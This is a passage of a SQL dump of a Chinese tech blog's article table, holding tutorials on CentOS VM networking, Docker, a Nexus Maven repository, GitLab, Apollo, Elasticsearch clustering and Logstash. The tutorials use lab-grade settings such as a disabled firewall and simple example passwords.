由于单点内置缓存只适合单体项目缓存,因为不支持共享不适用于分布式\n2. 分布式缓存正是解决单点内置缓存无法共享而产生的分布式中间件\n\n#### 单点缓存与分布式缓存结合使用\n![cache3.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555419881_cache3.png)\n1. 将单点缓存与分布式缓存相结合,分为一级缓存与二级缓存\n2. 以保证即使一级缓存宕机二级缓存依然可以保证缓存未穿透\n3. *注意缓存数据与数据库的数据一致性,设置缓存过期时间或修改后清除缓存数据*', 0, 0, 38, 0, 0, '2019-04-15 22:01:59', '2019-04-17 21:26:03', 0, 0);
INSERT INTO `article` VALUES (47, 1, '笔记本centos7虚拟机安装拷贝与固定ip配置', '2019/4/1556110756_e8970d0e4965a7ff542da82ef3864cc6.jpg', '### 下载虚拟机与系统\n#### vmwarePro15下载\n链接：https://pan.baidu.com/s/1NSbm_IjGV69DRMtvDabsTA \n提取码：7uu9\n\n#### centos7下载\nhttp://mirrors.aliyun.com/centos/7.6.1810/isos/x86_64/CentOS-7-x86_64-DVD-1810.iso\n\n### 安装搭建虚拟机\n![TIM截图20190424210404.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210404.png)\n![TIM截图20190424210440.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210440.png)\n![TIM截图20190424210448.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210448.png)\n![TIM截图20190424210718.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210718.png)\n![TIM截图20190424210740.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210740.png)\n![TIM截图20190424210824.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210824.png)\n![TIM截图20190424210929.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210929.png)\n![TIM截图20190424211319.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424211319.png)\n![TIM截图20190424212408.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424212408.png)\n\n### 配置固定ip\n#### 网络配置\n![TIM截图20190424213107.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556113333_TIM截图20190424213107.png)\n![TIM截图20190424213728.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556113333_TIM截图20190424213728.png)\n![TIM截图20190424214036.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556113333_TIM截图20190424214036.png)\n\n#### 虚拟机配置\n![TIM截图20190424215958.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556114689_TIM截图20190424215958.png)\n```c++\n// 1. 进入/etc/sysconfig/network-scripts目录\ncd /etc/sysconfig/network-scripts/\n\n// 2. 修改文件 ifcfg-e.. 每个虚拟机后缀可能会不一样\nvi ifcfg-eno16777736\n// 修改内容\nTYPE=Ethernet\n// 开机协议,设置为static \nBOOTPROTO=static\nPEERDNS=yes\nPEERROUTES=yes\nDEFROUTE=yes\nIPV4_FAILURE_FATAL=no\n#IPV6INIT=yes\n#IPV6_AUTOCONF=yes\n#IPV6_DEFROUTE=yes\n#IPV6_FAILURE_FATAL=no\n#IPV6_PEERDNS=yes\n#IPV6_PEERROUTES=yes\nNAME=ens33\nUUID=f0a20a07-94a6-47cb-8a24-47980d30f603\nDEVICE=ens33\n// 设置为开机启动\nONBOOT=yes\n// 主DNS1地址,114为常用DNS\nDNS1=114.114.114.114\n// 设置为想要的固定ip地址\nIPADDR=192.168.147.102\nNETMASK=255.255.255.0\n// 设置为虚拟网络编辑器中的网关ip\nGATEWAY=192.168.147.2\n\n// 3. 修改后重启网络服务\nservice network restart\n```\n#### 测试网络是否正常\n![TIM截图20190424220422.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556114689_TIM截图20190424220422.png)\n如果一切正常,那么就可以使用远程连接工具来连接固定ip的虚拟机了\n\n### 克隆虚拟机\n#### 创建克隆虚拟机\n![TIM截图20190424223812.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117001_TIM截图20190424223812.png)\n![TIM截图20190424223842.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223842.png)\n![TIM截图20190424223949.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223949.png)\n#### 克隆虚拟机需要修改网络配置\n![TIM截图20190424222137.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424222137.png)\n![TIM截图20190424223040.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223040.png)\n![TIM截图20190424223329.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223329.png)\n![TIM截图20190424223641.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223641.png)', 0, 0, 48, 0, 0, '2019-04-24 20:59:27', '2019-06-16 14:10:11', 0, 0);
INSERT INTO `article` VALUES (48, 1, 'docker安装配置与常用命令', '2019/4/1556199418_43f6913d115a57737941e71430bbdc2c.jpg', '### 安装docker\n#### 检查版本\n![TIM截图20190425214633.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556201665_TIM截图20190425214633.png)\n#### 开始安装\n```kotlin\n/* 依次输入以下命令 */\n// 1. 通过 uname -r 命令查看你当前的内核版本\nuname -r\n\n// 2. 使用 root 权限登录 Centos。确保 yum 包更新到最新\nyum -y update\n\n// 3. 卸载旧版本(如果安装过旧版本的话)\nyum remove docker docker-common docker-selinux docker-engine\n\n// 4. 安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的\nyum install -y yum-utils device-mapper-persistent-data lvm2\n\n// 5. 设置yum源\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\n\n// 6. 可以查看所有仓库中所有docker版本，并选择特定版本安装\nyum list docker-ce --showduplicates | sort -r\n\n// 7. 安装docker\nsudo yum install -y docker-ce\n\n// 8. 启动并加入开机启动\nsystemctl start docker\nsystemctl enable docker\n\n// 9. 验证安装是否成功(有client和service两部分表示docker安装启动都成功了) \ndocker version\n```\n![TIM截图20190425221310.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556202081_TIM截图20190425221310.png)\n\n### 采用阿里云镜像\n#### 前往阿里云获取信息\nhttps://cr.console.aliyun.com/cn-hangzhou/mirrors \n\n#### 复制粘贴命令\n![TIM截图20190425222730.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556283104_TIM截图20190425222730.png)\n![TIM截图20190425222614.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556283104_TIM截图20190425222614.png)\n\n### 镜像相关命令\n![TIM截图20190425225519.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556283311_TIM截图20190425225519.png)\n```kotlin\n// 1、搜索镜像\n// 执行该命令后,Docker就会在DockerHub中搜索含有java这个关键词的镜像仓库\n// 类似maven的中央仓库)中的镜像。\ndocker search java\n\n// 2. 下载镜像Docker会从仓库下载最新版本的 Java镜像。如果要下载指定版本则在java后面加冒号指定版本\ndocker pull java:8\n\n// 3. 列出已下载的镜像\ndocker images\n\n// 4. 删除镜像,若由该镜像创建过容器,则必须先删除镜像创建的容器\ndocker rmi d23bdf5b1b1b // IMAGE_ID\ndocker -f rmi (IMAGE_ID) // -f 强制删除,包括删除镜像创建的容器\n```\n\n### 容器相关命令\n![TIM截图20190426212618.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556286203_TIM截图20190426212618.png)\n![TIM截图20190426213038.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556286203_TIM截图20190426213038.png)\n![TIM截图20190426214118.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556286203_TIM截图20190426214118.png)\n```kotlin\n// 1. 开启80端口,关闭防火墙并重启docker服务\nfirewall-cmd --zone=public --add-port=80/tcp --permanent\nsystemctl stop firewalld\nsystemctl restart docker\n\n// 2. 启动容器， \ndocker run -d -p 80:80 nginx // -d 后台运行 -p 宿主机端口:容器端口\n\n// 3.查看执行中的容器列表\ndocker ps\ndocker ps -a // -a 显示所有,无论是否执行\n\n// 4. 查看容器程序是否正常启动\npx aux | grep nginx\n\n// 5. 查看容器详细信息\ndocker inspect e3347b654e92 // CONTAINER ID\n\n// 6. 停止运行容器\ndocker stop cranky_bell // docker ps -a 中容器的NAMES\n\n// 7. 删除容器\ndocker rm e3347b654e92 // CONTAINER ID\n```\n\n### 修改容器的配置文件\n![TIM截图20190427213237.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373313_TIM截图20190427213237.png)\n![TIM截图20190427213637.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373314_TIM截图20190427213637.png)\n![TIM截图20190427214512.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373314_TIM截图20190427214512.png)\n![TIM截图20190427214156.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373314_TIM截图20190427214156.png)\n```kotlin\n// 1. 进入容器内部,根据容器的CONTAINER ID\ndocker container exec -it a77028f174b5 /bin/bash\n\n// 2. 启动容器\ndocker start a77028f174b5 \n\n// 3. 停止容器\ndocker stop a77028f174b5 \n\n// 4. 重启容器\ndocker restart a77028f174b5\n\n```\n\n### 解决容器配置出错导致容器启动失败与挂载外部配置文件\n![TIM截图20190427220508.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427220508.png)\n![TIM截图20190427222509.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427222509.png)\n![TIM截图20190427222655.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427222655.png)\n![TIM截图20190427223353.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427223353.png)\n```kotlin\n// 1. 当容器中的配置文件拷贝至当前目录,根据容器id\ndocker cp fe59072e2cc5:/etc/nginx/conf.d/default.conf .\n\n// 2. 将文件拷贝覆盖至容器中的配置文件,根据容器id\ndocker cp /dockertemp/default.conf fe59072e2cc5:/etc/nginx/conf.d/default.conf\n```\n\n### 自定义镜像\n![TIM截图20190427232509.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556379157_TIM截图20190427232509.png)\n![TIM截图20190427232815.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556379157_TIM截图20190427232815.png)\n![TIM截图20190427233038.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556379157_TIM截图20190427233038.png)\n```kotlin\n// 1. 创建Dockerfile文件,添加以下内容\n// 指定java8环境镜像\nFROM java:8\n// 复制文件到容器目录/app.jar\nADD springboot-example.jar /app.jar\n// 声明启动端口号\nEXPOSE 8080\n// 配置容器启动后执行的命令\nENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"]\n\n// 2. 使用docker build命令构建镜像\n// docker build -t 镜像名称:标签 Dockerfile的相对位置\ndocker build -t spring-example-images .\n\n// 3. 启动一个镜像的容器,并指定外部端口与docker内部端口\ndocker run -p 8080:8080 spring-example-images\n```', 0, 0, 46, 0, 0, '2019-04-25 21:37:15', '2019-04-27 23:36:42', 0, 0);
INSERT INTO `article` VALUES (49, 1, 'docker搭建maven私服并上传与下载jar包', '2019/4/1556543150_23eac8068dffeb8e276fa9263119b30f.jpg', '### 安装与基本配置 \n#### 安装maven私服\n![TIM截图20190428220545.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190428220545.png)\n```kotlin\n// 1.下载一个nexus3的镜像\ndocker pull sonatype/nexus3\n\n// 2.将容器内部/var/nexus-data挂载到主机/root/nexus-data目录\ndocker run -d -p 8081:8081 --name nexus -v /root/nexus-data:/var/nexus-data --restart=always sonatype/nexus3\n\n// 3.关闭防火墙\nsystemctl stop firewalld\n\n// 4.查看nexus3是否正常运行在docker运行列表中,nexus3启动可能需要一分钟左右\ndocker ps\n```\n\n#### 进入nexus页面\n![TIM截图20190429210836.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190429210836.png)\n```kotlin\n// 1.访问服务器ip:8081\n192.168.147.100:8081\n\n// 2.登录\n默认用户 admin \n默认密码 admin123\n```\n\n\n#### 创建仓库\n![TIM截图20190428221401.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190428221401.png)\n![TIM截图20190428221448.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190428221448.png)\n![TIM截图20190428221826.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543982_TIM截图20190428221826.png)\n```kotlin\n1. 输入仓库名称\n\n2. DeploymentPoliecy处选择Allow redeploy,否则会上传失败\n\n3. 确定创建仓库\n```\n\n#### 创建用户\n![TIM截图20190428221918.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544307_TIM截图20190428221918.png)\n![TIM截图20190428221826.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544307_TIM截图20190428221826.png)\n```kotlin\n1. 填写用户信息,我的用户名是tuwq,密码123456\n\n2. Status状态处设置为Active可用状态\n\n3. Roles处选择管理员角色\n\n4. 确认创建用户\n \n```\n\n### 上传jar包至私服\n#### 查看刚刚创建的仓库url地址\n![TIM截图20190429212846.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544783_TIM截图20190429212846.png)\n\n#### 查看需要上传的jar包项目所使用的maven的settings文件路径\n![TIM截图20190428223640.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544783_TIM截图20190428223640.png)\n\n#### setting文件中添加刚创建的用户的信息\n![TIM截图20190428223845.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544783_TIM截图20190428223845.png)\n```kotlin\n// 1. servers标签下添加刚创建的用户的信息\n<server>\n	<id>tuwq</id>\n	<username>tuwq</username>\n	<password>123456</password>\n</server>\n```\n\n#### 上传的项目pom文件中添加配置\n![TIM截图20190428225234.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556545766_TIM截图20190428225234.png)\n```kotlin\n<!-- 私服maven相关配置 -->\n<distributionManagement>\n	<repository>\n		<!-- 配置settings.xml中servers下的用户配置信息  -->\n		<id>tuwq</id>\n		<!-- 配置打包url地址信息,这里的地址就是刚创建的仓库的上传url地址 -->\n		<url>http://192.168.147.100:8081/repository/springboot-example-release/</url>\n	</repository>\n</distributionManagement>\n<build>\n	<plugins>\n		<!-- 发布Java代码插件 -->\n		<plugin>\n			<groupId>org.apache.maven.plugins</groupId>\n			<artifactId>maven-deploy-plugin</artifactId>\n			<version>2.7</version>\n		</plugin>\n		<!-- 发布源码插件  -->\n		<plugin>\n			<groupId>org.apache.maven.plugins</groupId>\n			<artifactId>maven-source-plugin</artifactId>\n			<version>2.2.1</version>\n			<executions>\n				<execution>\n					<phase>package</phase>\n					<goals>\n						<goal>jar</goal>\n						</goals>\n				</execution>\n			</executions>\n		</plugin> \n	</plugins>\n</build>\n```\n\n#### 开始上传jar包\n![TIM截图20190429202348.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556545766_TIM截图20190429202348.png)\n![TIM截图20190429202428.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546035_TIM截图20190429202428.png)\n```kotlin\n// 1. 若不满足以下两项,那么会上传失败\n项目version中不能含有SNAPSHOT\n创建仓库时DeploymentPoliecy处选择Allow redeploy\n\n// 2. 进入cmd输入上传jar包至远程仓库的命令\nmvn deploy\n```\n\n#### 查看是否上传成功\n![TIM截图20190429202707.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546035_TIM截图20190429202707.png)\n\n### 下载私服jar包\n#### 引入私服jar包\n![TIM截图20190429215818.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546600_TIM截图20190429215818.png)\n```kotlin\n<!-- 引入jar包 -->\n<dependencies>\n	<dependency>\n		<groupId>com.tuwq</groupId>\n		<artifactId>springboot-basic</artifactId>\n		<version>0.0.1</version>\n	</dependency>\n</dependencies>\n\n<!-- 引入私服仓库 -->\n<repositories>\n	<repository>\n		<id>tuwq</id>\n		<url>http://192.168.147.100:8081/repository/springboot-example-release/</url>\n	</repository>\n</repositories>\n```\n#### 查看是否是私服下载的jar包\n![TIM截图20190429220035.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546600_TIM截图20190429220035.png)\n```kotlin\n1. 私服下载的jar包中有sha1文件,用户签名加密防篡改\n\n2. 若没有这些文件,说明引入的是本地项目\n\n3. 把与下载相同的本地项目删除并从本地maven仓库中也删除\n\n4. 将需引用jar包的项目进行maven update\n```', 2, 0, 56, 0, 0, '2019-04-29 21:06:00', '2019-06-02 23:06:39', 0, 0);
INSERT INTO `article` VALUES (50, 1, 'docker搭建gitlab', '2019/4/1556626302_19a3eaa31915ee793831a0209c74af2f.jpg', '### 安装配置\n![TIM截图20190429221556.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429221556.png)\n![TIM截图20190429224911.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429224911.png)\n```kotlin\n// 1. 下载镜像\ndocker pull beginor/gitlab-ce:11.0.1-ce.0\n\n// 2. 创建gitlab的三个目录,配置(etc),日志(log),数据(data)\nmkdir -p /mnt/gitlab/etc\nmkdir -p /mnt/gitlab/log\nmkdir -p /mnt/gitlab/data\n\n// 3. 运行gitlab容器\ndocker run \\\n    --detach \\\n    --publish 8443:443 \\\n    --publish 8090:80 \\\n    --name gitlab \\\n    --restart unless-stopped \\\n    -v /mnt/gitlab/etc:/etc/gitlab \\\n    -v /mnt/gitlab/log:/var/log/gitlab \\\n    -v /mnt/gitlab/data:/var/opt/gitlab \\\n    beginor/gitlab-ce:11.0.1-ce.0\n\n```\n![TIM截图20190429225521.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225521.png)\n![TIM截图20190429225732.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225732.png)\n```kotlin\n// 4. 修改/mnt/gitlab/etc/gitlab.rb,把external_url改成部署机器的域名或ip地址\nvi /mnt/gitlab/etc/gitlab.rb\n\nexternal_url \'http://192.168.212.227\'\n\n```\n\n![TIM截图20190429225838.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225838.png)\n![TIM截图20190429225938.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225938.png)\n```kotlin\n// 5. 修改/mnt/gitlab/data/gitlab-rails/etc/gitlab.yml\nvi /mnt/gitlab/data/gitlab-rails/etc/gitlab.yml\n\nhost: 192.168.147.100\nport: 8090\n```\n\n![TIM截图20190429231611.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626637_TIM截图20190429231611.png)\n```kotlin\n// 6. 停止容器\ndocker stop [容器id]\n\n// 7. 删除容器\ndocker rm [容器id]\n\n// 8. 重启容器\nsystemctl restart docker\n\n// 9. 运行容器\ndocker run \\\n    --detach \\\n    --publish 8443:443 \\\n    --publish 8090:80 \\\n    --name gitlab \\\n    --restart unless-stopped \\\n    -v /mnt/gitlab/etc:/etc/gitlab \\\n    -v /mnt/gitlab/log:/var/log/gitlab \\\n    -v /mnt/gitlab/data:/var/opt/gitlab \\\n    beginor/gitlab-ce:11.0.1-ce.0 \n\n//10. 关闭防火墙\nsystemctl stop firewalld \n```\n\n### 检查安装成功\n![TIM截图20190429230757.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429230757.png)\n![TIM截图20190429231047.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429231047.png)\n![TIM截图20190429231216.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429231216.png)\n![TIM截图20190429231252.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429231252.png)', 1, 0, 25, 0, 0, '2019-04-30 20:11:55', '2019-04-30 20:38:10', 0, 0);
INSERT INTO `article` VALUES (51, 1, 'apollo分布式配置中心环境搭建', '2019/5/1556945147_659652b5c781b079c9cf363b6e3134b9.jpg', '### 依赖及示范代码\n#### github下载\nhttps://github.com/nobodyiam/apollo-build-scripts\n\n#### 网盘下载\n链接：https://pan.baidu.com/s/1haT85VLpx0H5_qmYNZqvyg \n提取码：2mrc\n\n### 安装环境\n#### 添加数据库\n![TIM截图20190504132359.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947556_TIM截图20190504132359.png)\n![TIM截图20190504132547.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947556_TIM截图20190504132547.png)\n#### 解压文件\n![TIM截图20190501230405.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190501230405.png)\n```kotlin\n// 1. 安装zip,如果有的话就不用了\nyum -y install zip unzip\n\n// 2. 解压apollo文件\nunzip apollo-build-scripts-master.zip\n```\n#### 修改配置\n![TIM截图20190501231044.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190501231044.png)\n![TIM截图20190504130401.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190504130401.png)\n```kotlin\n// 3. 进入文件\ncd apollo build-scripts-master/\n\n// 4. 修改demo.sh\nvi demo.sh\n\n// 5. 修改apollo所需的数据库信息\napollo_config_db_url=jdbc:mysql://192.168.147.101:3306/ApolloConfigDB?characterEncoding=utf8\napollo_config_db_username=root\napollo_config_db_password=1234\n\napollo_portal_db_url=jdbc:mysql://192.168.147.101:3306/ApolloPortalDB?characterEncoding=utf8\napollo_portal_db_username=root\napollo_portal_db_password=1234\n\nconfig_server_url=http://192.168.147.101:8080\nadmin_server_url=http://192.168.147.101:8090\neureka_service_url=$config_server_url/eureka/\nportal_url=http://192.168.147.101:8070\n```\n\n#### 启动apollo\n![TIM截图20190501235159.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190501235159.png)\n```kotlin\n// 5. 启动apollo,需要等待将近一分钟\n./demo.sh start\n\n// 6. 关闭防火墙\nsystemctl stop firewalld\n```\n### 检查启动状态\n#### 查看配置中心与apollo自带的eureka是否启动成功\n![TIM截图20190504131950.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947285_TIM截图20190504131950.png)\n![TIM截图20190504132107.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947286_TIM截图20190504132107.png)', 0, 0, 27, 0, 0, '2019-05-04 12:45:57', '2019-06-16 14:07:54', 0, 0);
INSERT INTO `article` VALUES (52, 1, 'docker安装elasticsearch单机与集群', '2019/5/1557919789_3079d35197480a3248231f3cd0b61a73.jpg', '### docker安装单机elasticsearch与kibana\n![TIM截图20190513215541.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557920265_TIM截图20190513215541.png)\n![TIM截图20190513215244.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557920265_TIM截图20190513215244.png)\n![TIM截图20190513215147.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557920265_TIM截图20190513215147.png)\n\n#### 安装elasticsearch\n```kotlin\n// 1. 下载ES镜像问题\ndocker pull elasticsearch\n\n// 2. 运行ES\ndocker run -it --name elasticsearch -d -p 9200:9200 -p 9300:9300 -p 5601:5601 elasticsearch\n\n// 3. 测试运行结果\nhttp://192.168.212.245:9200/\n\n// !若访问失败,检查是否关闭防火墙\nsystemctl stop firewalld\n\n// !若运行失败,检查docker日志,内存不足2G会导致失败\ndocker log 容器id\n```\n#### 安装kibana\n```kotlin\n// 1. 运行kibana,前提是运行elasticsearch成功\ndocker run -it -d -e ELASTICSEARCH_URL=http://127.0.0.1:9200 --name kibana --network=container:elasticsearch kibana\n// 2. 测试运行结果\nhttp://192.168.212.245:5601/app/kibana\n\n```\n\n### docker安装集群elasticsearch与kibana\n![TIM截图20190515214636.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933295_TIM截图20190515214636.png)\n![TIM截图20190515220308.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933295_TIM截图20190515220308.png)\n![TIM截图20190515221133.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933295_TIM截图20190515221133.png)\n![TIM截图20190515221318.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515221318.png)\n![TIM截图20190515222919.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515222919.png)\n![TIM截图20190515223426.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515223426.png)\n![TIM截图20190515223626.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515223626.png)\n\n```kotlin\n// 1. 删除之前单机版的elasticsearch与kibana容器\ndocker rm $(sudo docker ps -a -q) // 删除所有未运行的容器\n\n// 2. 进入/usr/local创建es相关文件夹\ncd /usr/local\nmkdir -p es/config\ncd es\n\n// 3. 创建集群相关文件夹\nmkdir data1\nmkdir data2\nmkdir  plugins1\nmkdir  plugins2\n\n// 4. 开放两个es节点的tcp端口\nfirewall-cmd --add-port=9300/tcp\nfirewall-cmd --add-port=9301/tcp\n\n// 5. 在es/config分别放入es1.yml、es2.yml\n// es1.yml\ncluster.name: elasticsearch-cluster\nnode.name: es-node1\nnetwork.bind_host: 0.0.0.0\nnetwork.publish_host: 192.168.147.100\nhttp.port: 9200\ntransport.tcp.port: 9300\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"*\"\nnode.master: true \nnode.data: true  \ndiscovery.zen.ping.unicast.hosts: [\"192.168.147.100:9300\",\"192.168.147.100:9301\"]\ndiscovery.zen.minimum_master_nodes: 1 \n// es2.yml\ncluster.name: elasticsearch-cluster\nnode.name: es-node2\nnetwork.bind_host: 0.0.0.0\nnetwork.publish_host: 192.168.147.100\nhttp.port: 9201\ntransport.tcp.port: 9301\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"*\"\nnode.master: true \nnode.data: true  \ndiscovery.zen.ping.unicast.hosts: [\"192.168.147.100:9300\",\"192.168.147.100:9301\"]\ndiscovery.zen.minimum_master_nodes: 1 \n\n7. 修改/etc/sysctl.conf文件,否则es启动会出现内存分配不足错误\nvi /etc/sysctl.conf\nvm.max_map_count=262144\nsysctl -p\n\n6. 启动容器节点1\ndocker run -e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" -d -p 9200:9200 -p 9300:9300 -p 5601:5601 -v /usr/local/es/config/es1.yml:/usr/share/elasticsearch/config/elasticsearch.yml -v /usr/local/es/plugins1:/usr/share/elasticsearch/plugins -v /usr/local/es/data1:/usr/share/elasticsearch/data --name ES01 elasticsearch\n\n7. 启动容器节点2\ndocker run -e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" -d -p 9201:9201 -p 9301:9301 -v /usr/local/es/config/es2.yml:/usr/share/elasticsearch/config/elasticsearch.yml -v /usr/local/es/plugins2:/usr/share/elasticsearch/plugins -v /usr/local/es/data2:/usr/share/elasticsearch/data --name ES02 elasticsearch\n\n8. 查看集群节点信息\nhttp://192.168.147.100:9200/_cat/nodes?pretty\n```\n\n#### es集群启动kibana\n![TIM截图20190515224607.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933784_TIM截图20190515224607.png)\n```kotlin\n// 1. 启动kibana,随便选取集群中一个es节点的tcp端口\ndocker run -it -d -e ELASTICSEARCH_URL=http://127.0.0.1:9200 --name kibana --network=container:ES01 kibana\n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 查看kibana是否在docker中正常运行\ndocker ps\n\n// 4. 访问kibana\nhttp://192.168.147.100:5601/app/kibana\n```', 0, 0, 41, 0, 0, '2019-05-15 19:30:10', '2019-06-02 21:41:47', 0, 0);
INSERT INTO `article` VALUES (53, 1, 'logstash将mysql数据同步至elasticsearch', '2019/5/1557921111_38291b7a45886cb77cc94811b11a5016.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1mFwgyNf28oSWnVOLMhhcWQ \n提取码：2xkx \n### 安装logstash\n#### 安装logstash并安装输入输出插件\n![TIM截图20190514203528.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514203528.png)\n\n### 同步单张表至elasticsearch\n#### 创建预备的数据表\n![TIM截图20190514220905.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514220905.png)\n\n#### 编写logstash所识别的配置文件\n![TIM截图20190514221956.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514221956.png)\n\n#### 上传mysql驱动包与配置文件并运行logstash\n![TIM截图20190514220313.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514220313.png)\n![TIM截图20190514221025.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514221025.png)\n\n#### 查看是否成功输出至elasticsearch\n![TIM截图20190514221151.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922292_TIM截图20190514221151.png)\n\n#### 步骤命令\n```kotlin\n// 1. 上传logstash-6.4.3.tar.gz到服务中\n// 2. 解压logstash压缩包\ntar –zxvf  logstash-6.4.3.tar.gz\n\n// 3. 进入logstash目录\ncd logstash-6.4.3\n\n// 4. 安装输入插件\nbin/logstash-plugin install logstash-input-jdbc\n\n// 5. 安装输出插件\nbin/logstash-plugin install logstash-output-elasticsearch\n\n// 6. 编写logstash所识别的配置文件\n// 7. 上传mysql驱动包至/usr/local/sql/ mysql-connector-java-5.1.46.jar\n// 8. ./bin/logstash -f mysql.conf 指定配置文件启动\n./bin/logstash -f mysql.conf\n```\n\n#### 